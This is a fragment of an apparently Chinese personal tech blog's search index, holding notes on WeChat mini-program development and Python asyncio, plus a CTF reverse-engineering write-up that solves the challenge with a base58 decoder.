title="get发包里的data问题"></a>get发包里的data问题</h3><p>wx.request里的get发包，会自动组合data里的param，试了下mock也这样，姑且认为前端都这样。<br>pyth似乎不会？一些客户端比如burpsuite啥的就该是哪就是哪</p><h3 id="wx-key-’index’-似乎只能用index？"><a href="#wx-key-’index’-似乎只能用index？" class="headerlink" title="wx:key=’index’ 似乎只能用index？"></a>wx:key=’index’ 似乎只能用index？</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210220235846721_3510.png"><br>试了下其他参数不生效，蛮怪的</p><h3 id="width-100-问题"><a href="#width-100-问题" class="headerlink" title="width:100%问题"></a>width:100%问题</h3><p>有可能无效，换成750rpx可以。</p><p>以下姑且认为是：不设flex，那就是画出square大小然后拉长。设了那就按照flex样式居中<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210304194217411_28066.png"></p><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210304194231973_32239.png"></p><h3 id="amp-amp-和"><a href="#amp-amp-和" class="headerlink" title="&amp;&amp;和||"></a>&amp;&amp;和||</h3><p>&amp;&amp;运算符优先级大于||<br><strong>a || b</strong></p><blockquote><p>如果a是true，那么b不管是true还是false，都返回true。因此不用判断b了，这个时候刚好判断到a，因此返回a。<br>如果a是false，那么就要判断b，如果b是true，那么返回true，如果b是false，返回false，其实不就是返回b了吗。</p></blockquote><p><strong>a &amp;&amp; b</strong></p><blockquote><p>如果a是false，那么b不管是true还是false，都返回false，因此不用判断b了，这个时候刚好判断到a，因此返回a。<br>如果a是true，那么就要在判断b，和刚刚一样，不管b是true是false，都返回b。</p></blockquote><h3 id="this-setData与this-data"><a href="#this-setData与this-data" class="headerlink" title="this.setData与this.data"></a>this.setData与this.data</h3><p><code>this.setData(&#123;&#125;)</code>用于将数据从逻辑层发送到视图层（异步），同时改变对应的<code> this.data</code> 的值（同步）。<br>用<code>this.data</code>而不用<code>this.setData(&#123;&#125;)</code>会造成页面内容不更新的问题。<br>简而言之就是：需要页面更新必须用<code>this.setData()</code></p><hr><h2 id="写法记录"><a href="#写法记录" class="headerlink" title="写法记录"></a>写法记录</h2><h3 id="父传子属性，子传父方法"><a href="#父传子属性，子传父方法" class="headerlink" title="父传子属性，子传父方法"></a>父传子属性，子传父方法</h3><h4 id="父传子属性"><a href="#父传子属性" class="headerlink" title="父传子属性"></a>父传子属性</h4><p>在父里直接写<br><code>goodsid=&#39;abcd&#39;</code><br>然后在子里设置接收的值</p><p>这个值就当做data里的值直接用即可。</p><h4 id="子传父方法"><a href="#子传父方法" class="headerlink" title="子传父方法"></a>子传父方法</h4><p>子绑定的事件</p><pre class="line-numbers language-none"><code class="language-none">onNavBarTap(e) &#123;  this.triggerEvent(&quot;jump&quot;, &#123; navbarTapIndex &#125;);&#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在父了写<code>bind:jump=&quot;autoScroll&quot;</code>,将子和父联动，执行<code>autoScrol(e)</code><br>而传过来的参数在<code>e.detail.navbarTapIndex</code></p><h3 id="背景色占满整个屏幕"><a href="#背景色占满整个屏幕" class="headerlink" title="背景色占满整个屏幕"></a>背景色占满整个屏幕</h3><pre class="line-numbers language-none"><code class="language-none">page&#123;background-color:#111;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>page前面没有点</p><h3 id="好看的红色椭圆按钮"><a href="#好看的红色椭圆按钮" class="headerlink" title="好看的红色椭圆按钮"></a>好看的红色椭圆按钮</h3><pre class="line-numbers language-none"><code class="language-none">.buy &#123;    margin: 12rpx 24rpx 0;    font-weight: 700;    display: block;    width: 226rpx;    height: 76rpx;    line-height: 76rpx;    text-align: center;    font-size: 26rpx;    border-radius: 40rpx;    background-color: #f2270c;    color: #fff;    font-size: 28rpx;    background-image: linear-gradient(135deg, #f2140c, #f2270c 70%, #f24d0c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="不是最后一个子元素"><a href="#不是最后一个子元素" class="headerlink" title="不是最后一个子元素"></a>不是最后一个子元素</h3><pre class="line-numbers language-none"><code class="language-none">.word:not(:last-child) &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="向右小箭头css直接写"><a href="#向右小箭头css直接写" class="headerlink" title="向右小箭头css直接写"></a>向右小箭头css直接写</h3><pre class="line-numbers language-none"><code class="language-none">.shop_name::after &#123;    content: &quot;&quot;;    display: block;    width: 16rpx;    height: 16rpx;    border-top: 2rpx solid #999;    border-left: 2rpx solid #999;    transform-origin: 50%;    transform: rotate(135deg);    position: absolute;    width: 12rpx;    height: 12rpx;    right: 10rpx;    top: 50%;    margin-top: -8rpx;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="图片和文字对齐"><a href="#图片和文字对齐" class="headerlink" title="图片和文字对齐"></a>图片和文字对齐</h3><p>外层的view要加vertical-align: middle;<br>内层的img也要加vertical-align: middle;</p><h3 id="取整"><a href="#取整" class="headerlink" title="取整"></a>取整</h3><p>1.导入wxs<br>2.<code>&#123;&#123;price | Int&#125;&#125;</code></p><h3 id="多行溢出文字变成省略号"><a href="#多行溢出文字变成省略号" class="headerlink" title="多行溢出文字变成省略号"></a>多行溢出文字变成省略号</h3><p>不过得确定要几行</p><pre class="line-numbers language-none"><code class="language-none">display: -webkit-box;-webkit-line-clamp: 2; &#x2F;&#x2F;行数-webkit-box-orient: vertical;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="template使用"><a href="#template使用" class="headerlink" title="template使用"></a>template使用</h3><p><code>&lt;template is=&quot;showcase-book&quot; data=&quot;&#123;&#123;books: recommendBooks&#125;&#125;&quot;&gt;&lt;/template&gt;</code></p><pre class="line-numbers language-none"><code class="language-none">&lt;template name&#x3D;&quot;showcase-book&quot;&gt;    &lt;view wx:for&#x3D;&quot;&#123;&#123;books&#125;&#125;&quot; wx:key&#x3D;&quot;id&quot;&gt;&lt;&#x2F;view&gt;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="一行map添加数组"><a href="#一行map添加数组" class="headerlink" title="一行map添加数组"></a>一行map添加数组</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210220234651381_11894.png"><br><code>recommendBooks: res[0].data.map((i) =&gt; i.book)</code><br>挺牛的<br>map相当于取数组每个元素,后面的lamda表达式相当于return每个数组的i.book</p><h3 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h3><p>利用对象的属性不会重复这一特性，校验数组元素是否重复</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">distinct</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">let</span> arr <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> result<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用Set成员唯一性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">distinct</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>a<span class="token punctuation">,</span> <span class="token operator">...</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//...也是一种运算符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="心得积累"><a href="#心得积累" class="headerlink" title="心得积累"></a>心得积累</h2><p>多设设页面状态，以便查看异步下的页面情况</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>pageStatus<span class="token operator">:</span> <span class="token string">'loading'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>pageStatus<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>并非是连贯性的执行完p2执行then之后再执行catch<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210514211546192_20868.png"><br>而是触发了<code>resolve()</code>,状态变成<code>resolve</code>,才允许执行<br>而且是等着一层(同步)执行完，再执行then。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Promise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"resolved."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hi!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Promise</span><span class="token comment">// Hi!</span><span class="token comment">// resolved.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Promise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"resolved."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hi!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Promise</span><span class="token comment">// Hi!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异步Asyncio学习笔记</title>
      <link href="/p/574792763.html"/>
      <url>/p/574792763.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真就一年发一篇。这一年发生了好多事，把我打得手忙脚乱，短短一年，物是人非。</p><p>昨天写awd相关脚本，想着来点狠的，加速混淆流量发包，试试异步。正好看到github上有相关源码，requests+asyncio。</p><p>想着requests是阻塞的怎么能用异步呢？折腾了好久，看着12345顺序发包，这<del>他娘</del>不就是同步发送吗！！</p><p>得，都花那么长时间了，来都来了。又开始研究异步原理，尝试httpx+asyncio。折腾好久，失败了。</p><p>翻文档视频教程到11点，最后发现，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">with</span> httpx<span class="token punctuation">.</span>AsyncClient<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>httpx.AsyncClient</code>后面的小括号没加，try捕捉到的报错又被我pass了</p><p><img src="https://i.loli.net/2021/07/02/yr7PaN1YJgzxwbE.jpg"></p><p>无语，姑且把中间做的笔记记一下吧。</p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>await 后面只能跟：协程对象，task对象，future对象<br>await意义：等待一个函数结束，在等待的过程中切换到其他函数执行以免浪费时间。以此实现并发。<br>python&gt;=3.7之后，建议用<code>asyncio.create_task()</code>创建task对象</p><h3 id="注释事项"><a href="#注释事项" class="headerlink" title="注释事项"></a>注释事项</h3><ul><li><p>直接<code>await task</code>不会对并发有帮助</p><p>错误用法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>正确用法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    task1 <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    task2 <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> task1    <span class="token keyword">await</span> task2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Python3.7之后新增接口</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>两者等价</p><h3 id="实用范例"><a href="#实用范例" class="headerlink" title="实用范例"></a>实用范例</h3><ul><li>范例1 在协程函数内部创建tasks并组合</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tasks<span class="token operator">=</span><span class="token punctuation">[</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    done<span class="token punctuation">,</span>pending <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>范例2 在外面把协程函数组合成tasks</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">await</span> asnycio<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>tasks<span class="token operator">=</span><span class="token punctuation">[</span>func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="asyncia-非异步函数搭配"><a href="#asyncia-非异步函数搭配" class="headerlink" title="asyncia+非异步函数搭配"></a>asyncia+非异步函数搭配</h3><p>requests默认不支持异步，但可以通过线程池配合实现。但耗费资源较多</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_request</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">,</span> url<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token keyword">await</span> futuretasks <span class="token operator">=</span> <span class="token punctuation">[</span>_request<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> url_list<span class="token punctuation">]</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="uvloop，性能提升！"><a href="#uvloop，性能提升！" class="headerlink" title="uvloop，性能提升！"></a>uvloop，性能提升！</h3><p>用uvloop代替asyncio默认的事件循环以提升2倍以上性能。</p><pre class="line-numbers language-none"><code class="language-none">import asyncioimport uvloopasyncio.set_event_loop_policy(uvloop.EventLoopPolicy())# 后续代码与asyncio代码一致，内部事件循环会自动转化为uvloop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>python模块uvloop暂不支持windows和python3.9</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Asyncio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[2021GKCTF]QQQQT</title>
      <link href="/p/2157961736.html"/>
      <url>/p/2157961736.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[base58|加密算法题|密码学|常见加密]</p><p>当时没做出来，贴贴wp里的内容</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224317385.png" alt="image-20210719224317385"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224320436.png" alt="image-20210719224320436"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224323676.png" alt="image-20210719224323676"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224329109.png" alt="image-20210719224329109"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">b58encode</span><span class="token punctuation">(</span>tmp<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    base58 <span class="token operator">=</span> <span class="token string">"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">*</span> <span class="token number">256</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        tmp<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> temp <span class="token operator">%</span> <span class="token number">58</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> temp <span class="token operator">//</span> <span class="token number">58</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        temp <span class="token operator">+=</span> base58<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> temp<span class="token keyword">def</span> <span class="token function">b58decode</span><span class="token punctuation">(</span>tmp<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    base58 <span class="token operator">=</span> <span class="token string">"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"</span>    temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>base58<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> tmp <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> temp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># unhexlify()=a2b_hex()，将16进制数转化为相应ascii码字符串</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token builtin">cmp</span> <span class="token operator">=</span> <span class="token string">"56fkoP8KhwCf3v7CEz"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> b58decode<span class="token punctuation">(</span><span class="token builtin">cmp</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> 常见加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[极客大挑战 2019]RCE ME</title>
      <link href="/p/3316915752.html"/>
      <url>/p/3316915752.html</url>
      
